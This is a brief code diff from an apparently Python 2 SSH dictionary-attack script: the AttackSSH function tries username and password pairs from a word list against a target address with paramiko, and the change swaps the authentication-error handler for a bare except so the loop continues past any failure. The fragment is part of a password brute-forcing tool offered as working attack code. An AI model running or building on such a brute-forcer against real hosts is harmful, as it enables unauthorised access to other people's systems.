@@ -17,7 +17,7 @@ def AttackSSH(ipAddress, dictionaryFile):
             print "[+] Trying to break in with username: %s password: %s " % (username, password)
             ssh.connect(ipAddress, username=username, password=password)
 
-        except paramiko.AuthenticationException:
+        except:
             print "[-] Failed! ..."
             continue
 
